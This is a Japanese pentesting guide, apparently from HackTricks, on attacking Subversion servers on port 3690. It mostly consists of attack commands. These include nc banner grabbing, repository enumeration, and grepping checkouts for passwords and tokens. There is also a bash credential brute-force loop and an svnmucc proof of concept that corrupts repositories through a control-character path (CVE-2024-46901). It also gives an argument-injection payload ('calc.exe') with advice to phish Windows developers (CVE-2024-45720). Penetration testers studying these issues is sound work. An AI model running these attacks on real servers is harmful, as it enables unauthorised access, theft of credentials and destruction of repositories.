# 3690/tcp - Pentesting Subversion (SVN) サーバ

{{#include ../banners/hacktricks-training.md}}

## 基本情報

**Subversion (SVN)** は集中型の **バージョン管理システム**（Apache ライセンス）で、ソフトウェアのバージョン管理とリビジョン管理に使用されます。

**Default port:** `3690/tcp` (svnserve)。`mod_dav_svn` を介した **HTTP/HTTPS** や **svn+ssh** 経由でも公開されることがあります。
```text
PORT     STATE SERVICE
3690/tcp open  svnserve Subversion
```
### Banner Grabbing
```bash
nc -vn 10.10.10.10 3690
svnserve --version           # if shell access is obtained
svn --version                # client version leak via error messages
```
## 列挙
```bash
# Anonymous / authenticated listing
svn ls svn://10.10.10.203                  # list root
svn ls -R svn://10.10.10.203/repo         # recursive list
svn info svn://10.10.10.203/repo          # repo metadata
svn log svn://10.10.10.203/repo           # commit history
svn checkout svn://10.10.10.203/repo      # checkout repository
svn up -r 2                               # move working copy to revision 2
svn diff -r 1:HEAD svn://10.10.10.203/repo   # view changes

# If served over HTTP(S)
svn ls https://10.10.10.10/svn/repo --username guest --password ''

# Extract revision props (often contain build creds, URLs, tokens)
svn propget --revprop -r HEAD svn:log svn://10.10.10.203/repo
```
### 認証と設定ミスの探索

- `svnserve.conf` は `anon-access = read`（場合によっては write）を許可していることがあります。一覧表示が可能なら、`checkout` を試して秘密情報、スクリプト、CI トークンをダンプしてください。
- リポジトリはしばしばバージョン管理された設定ファイルにビルドパイプライン、デプロイキー、データベースの認証情報を保存します。`checkout` 後にワーキングコピーを grep してください: `grep -R "password\|secret\|token" -n .`.
- svn+ssh が有効な場合、ユーザのシェルは制限された `svnserve` コマンドを許すことが多いです。ラッパーを回避するために、加工したサブコマンドで `ssh user@host svnserve -t` を試してみてください。

### 資格情報のブルートフォース（svnserve）

`sasl` 認証（有効な場合）や単純なパスワードファイルはトランスポートによってのみ保護されます；デフォルトではロックアウトはありません。簡単な Bash ループで認証情報を試すことができます:
```bash
for u in admin dev ci; do
for p in $(cat /tmp/passlist); do
svn ls --username "$u" --password "$p" svn://10.10.10.203/repo 2>/dev/null && echo "[+] $u:$p" && break
done
done
```
## 最近の脆弱性（実務での影響）

### mod_dav_svn による制御文字を使った DoS (CVE-2024-46901)

- コミット権限を持つユーザーは、制御文字（例: `\x01`, `\x7f`）を含むパスを書き込むことで、**リポジトリが破損する**可能性があり、後続のチェックアウトやログが失敗したり、`mod_dav_svn` ワーカーがクラッシュする可能性がある。
- Subversion ≤ **1.14.4** が **HTTP(S)** (`mod_dav_svn`) 経由で配信されている場合に影響。**1.14.5** で修正済み。
- PoC は `svnmucc` を使ったコミット（有効なコミット資格情報が必要）:
```bash
# create payload file
printf 'pwn' > /tmp/payload
# commit a path with a control character in its name
svnmucc -m "DoS" put /tmp/payload $'http://10.10.10.10/svn/repo/trunk/bad\x01path.txt'
```
- コミット後、通常のクライアントはクラッシュしたり、管理者が手動で `svnadmin dump/filter/load` でリビジョンを削除するまで更新を拒否することがあります。

### Windows argument injection in svn client (CVE-2024-45720)

- Windowsでは、`svn.exe` の「best-fit」文字エンコーディングにより、特別に細工された非ASCIIパス/URLを処理する際に **command-line argument injection** が発生し、任意のプログラム実行につながる可能性があります。
- Windows のみで Subversion ≤ **1.14.3** に影響; **1.14.4** で修正。攻撃面: 攻撃者が制御する URL/パス上で `svn` を実行するよう開発者を phishing すること。
- Pentest angle: Windows 開発者に渡すネットワーク共有や ZIP を制御できる場合、repo URL や working-copy パスに best-fit バイト列を含め、それが `" & calc.exe & "` のような注入引数にデコードされるように名前を付け、被害者を騙してそのパスで `svn status` 等を実行させます。

## エクスプロイト実行ワークフローの注意点

1. アクセス方式を確認: `svn://` (svnserve), `http(s)://.../svn/` (mod_dav_svn), または `svn+ssh://`。
2. まず匿名読み取りを試し、それから一般的な認証情報をスプレーします。HTTP Basic が使われている場合、他で見つかった認証情報を再利用します。
3. hooks を列挙する: `hooks/pre-commit`、`post-commit` スクリプトにはプレーンテキストの認証情報やホスト名が含まれていることがあります。
4. `svn:externals` を活用して他ホストから追加のパスを取り込みます。checkout 後に `svn propget svn:externals -R .` で一覧表示します。
5. Version leaks: `mod_dav_svn` の HTTP レスポンスヘッダーは通常 Subversion と Apache のバージョンを表示します。1.14.5 と比較して脆弱なターゲットを特定します。
6. リポジトリのファイルシステムアクセスを取得した場合、`svnadmin dump`/`svnlook author`/`svnlook dirs-changed` により認証情報なしでオフライン解析が可能です。

## References

- [Apache Subversion security advisory CVE-2024-46901](https://subversion.apache.org/security/CVE-2024-46901-advisory.txt)
- [Apache Subversion security advisory CVE-2024-45720](https://subversion.apache.org/security/CVE-2024-45720-advisory.txt)
{{#include ../banners/hacktricks-training.md}}
